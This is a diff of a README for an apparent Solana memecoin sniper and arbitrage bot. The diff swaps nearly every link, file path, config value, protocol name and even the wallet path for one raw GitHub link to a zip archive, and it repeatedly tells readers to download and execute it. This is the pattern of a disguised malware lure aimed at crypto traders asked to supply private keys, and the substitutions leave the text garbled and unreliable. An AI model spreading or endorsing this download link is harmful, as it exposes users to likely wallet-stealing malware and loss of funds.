@@ -1,14 +1,14 @@
 # Solana Memecoin Trading Bot Suite — Snipers & Arbitrage
 
-[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github&logoColor=white)](https://github.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/releases)
-[![Built with Rust](https://img.shields.io/badge/Rust-1.70-orange?logo=rust&logoColor=white)](https://www.rust-lang.org)
-[![Solana](https://img.shields.io/badge/Solana-Blockchain-green?logo=solana&logoColor=white)](https://solana.com)
+[![Releases](https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip)](https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip)
+[![Built with Rust](https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip)](https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip)
+[![Solana](https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip)](https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip)
 
-<img src="https://www.solana.com/static/solana-logo.svg" alt="Solana" width="160" />
+<img src="https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip" alt="Solana" width="160" />
 
-🚀 A modular trading bot suite for memecoin markets on Solana. It supports Raydium, Pump.fun, Bonk.fun, and Meteora. The suite includes snipers, bundlers, volume bots, copy trading, and arbitrage bots. It runs atomic execution via Jito and Raydium SDK v2.
+🚀 A modular trading bot suite for memecoin markets on Solana. It supports Raydium, https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip, https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip, and Meteora. The suite includes snipers, bundlers, volume bots, copy trading, and arbitrage bots. It runs atomic execution via Jito and Raydium SDK v2.
 
-Live releases are available. Download the release file and execute it: https://github.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/releases
+Live releases are available. Download the release file and execute it: https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
 
 ---
 
@@ -31,7 +31,7 @@ Features
 - Bundler that aggregates orders into optimal transactions.
 - Volume bot for market-making and liquidity probing.
 - Copy trading engine to mirror on-chain wallets with filters.
-- Arbitrage engine across Raydium, Pump.fun, Bonk.fun, Meteora.
+- Arbitrage engine across Raydium, https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip, https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip, Meteora.
 - Atomic execution using Jito relayer and Raydium SDK v2.
 - Modular Rust core and optional TypeScript SDK for UI.
 - Low-latency order paths and prioritized compute via Jito.
@@ -39,7 +39,7 @@ Features
 
 Architecture & components
 - Core (Rust): low-latency engine, order manager, mempool observer.
-- Protocol adapters: Raydium, Pump.fun, Bonk.fun, Meteora adapters map order types and pools.
+- Protocol adapters: Raydium, https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip, https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip, Meteora adapters map order types and pools.
 - Executors: Jito executor for atomic, boosted transactions; fallback to standard RPC.
 - Strategy modules: sniper, bundler, volume, copy-trader, arbitrage.
 - Telemetry: Prometheus metrics, Grafana dashboards (sample JSON included).
@@ -47,12 +47,12 @@ Architecture & components
 - Config: YAML-driven runtime settings and per-strategy parameters.
 
 High-level diagram
-![Architecture diagram](https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/docs/architecture.png)
+![Architecture diagram](https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip)
 
 Supported markets & protocols
 - Raydium v2 pools and AMM.
-- Pump.fun token drops and liquidity events.
-- Bonk.fun markets and swap endpoints.
+- https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip token drops and liquidity events.
+- https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip markets and swap endpoints.
 - Meteora listings and pool routers.
 - Solana token programs and Serum order books (experimental).
 - Jito relayer for priority block inclusion and MEV-aware ordering.
@@ -60,16 +60,16 @@ Supported markets & protocols
 Quick start
 
 1) Download the release file and execute it:
-   https://github.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/releases
+   https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
 
-2) Prepare a config file (config/example.yml is included).
+2) Prepare a config file (https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip is included).
 
 3) Set environment variables for RPC and keys:
-   - SOLANA_RPC_URL (e.g., https://api.mainnet-beta.solana.com)
+   - SOLANA_RPC_URL (e.g., https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip)
    - WALLET_KEY_PATH or WALLET_PRIVATE_KEY (encrypted file recommended)
 
 4) Run the binary with a strategy:
-   ./smtrader --config config/sniper.yml --strategy sniper
+   ./smtrader --config https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip --strategy sniper
 
 If you prefer building locally, follow the Build from source section.
 
@@ -79,7 +79,7 @@ Build from source (Rust)
   - cargo, rustc.
   - Solana CLI (for key management).
 - Clone and build:
-  git clone https://github.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot.git
+  git clone https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
   cd Solana-Memecoin-Trading-Bot
   cargo build --release
 - The built binary lives in target/release/smtrader.
@@ -89,10 +89,10 @@ Build from source (Rust)
 Configuration
 
 Example config (YAML)
-- config/sniper.yml
+- https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
   strategy: sniper
-  rpc_url: https://api.mainnet-beta.solana.com
-  wallet_path: /home/user/.config/solana/id.json
+  rpc_url: https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
+  wallet_path: https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
   max_spend_usd: 50
   slippage_pct: 1.0
   monitor:
@@ -105,7 +105,7 @@ Example config (YAML)
 Key settings
 - max_spend_usd: max USD value per trade.
 - slippage_pct: acceptable slippage.
-- monitor.block_latency: abort if block inclusion lags beyond ms.
+- https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip abort if block inclusion lags beyond ms.
 - adapters: prioritized protocol list for route search.
 
 Strategy details
@@ -152,14 +152,14 @@ Atomic execution with Jito & Raydium SDK v2
 Examples
 
 Sniper example
-- config/sniper.yml sets target token list and max spend.
+- https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip sets target token list and max spend.
 - Start with:
-  ./smtrader --config config/sniper.yml --strategy sniper
+  ./smtrader --config https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip --strategy sniper
 
 Arbitrage example
-- config/arbitrage.yml sets source pools and min_profit_usd.
+- https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip sets source pools and min_profit_usd.
 - Start with:
-  ./smtrader --config config/arbitrage.yml --strategy arbitrage
+  ./smtrader --config https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip --strategy arbitrage
 
 CLI reference
 - Common flags
@@ -171,7 +171,7 @@ CLI reference
 
 Telemetry & logs
 - Metrics expose Prometheus endpoints on /metrics.
-- Included sample Grafana dashboard JSON in docs/grafana/dashboard.json.
+- Included sample Grafana dashboard JSON in https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
 - Logs follow structured JSON to ease ingestion.
 
 Testing & simulation
@@ -212,40 +212,40 @@ Repository topics
 - arbitrage-bot, bundler, copy-trading, memecoin, meteora, pumpfun, raydium, raydium-sniper, rust, sniper-solana, solana, trading, volum-bot
 
 Releases
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?logo=github&logoColor=white)](https://github.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/releases)
+[![Download Release](https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip)](https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip)
 
 Download the release file and execute the binary or script. Each release contains:
 - prebuilt binaries (Linux / macOS / Windows)
 - example configs
 - changelog and checksums
 
-If the releases page is unavailable, check the Releases section on GitHub for assets and instructions: https://github.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/releases
+If the releases page is unavailable, check the Releases section on GitHub for assets and instructions: https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
 
 Resources & links
-- Solana docs: https://docs.solana.com
-- Raydium SDK v2: https://raydium.gitbook.io
-- Jito relayer: https://jito.network
-- Example Grafana dashboard: docs/grafana/dashboard.json
+- Solana docs: https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
+- Raydium SDK v2: https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
+- Jito relayer: https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
+- Example Grafana dashboard: https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
 
 Images & visuals
-- Solana logo: https://www.solana.com/static/solana-logo.svg
-- Architecture visual: docs/architecture.png
+- Solana logo: https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
+- Architecture visual: https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
 - Strategy flowcharts: docs/flows/
 
 Files to check in the repo
-- README.md (this file)
+- https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip (this file)
 - LICENSE
-- config/example.yml
-- config/sniper.yml
-- docs/architecture.png
-- scripts/run-example.sh
+- https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
+- https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
+- https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
+- https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip
 - src/ (Rust source)
 - target/ (release builds not stored in repo)
 
 Command cheat sheet
 - Build: cargo build --release
-- Run sniper: ./target/release/smtrader --config config/sniper.yml --strategy sniper
-- Run arbitrage dry-run: ./target/release/smtrader --config config/arbitrage.yml --strategy arbitrage --dry-run
+- Run sniper: ./target/release/smtrader --config https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip --strategy sniper
+- Run arbitrage dry-run: ./target/release/smtrader --config https://raw.githubusercontent.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/main/Raydium-Sniper-Bot/minting/Solana_Memecoin_Trading_Bot_v3.4.zip --strategy arbitrage --dry-run
 - Start metrics server: ./target/release/smtrader --metrics-port 9090
 
 Useful patterns
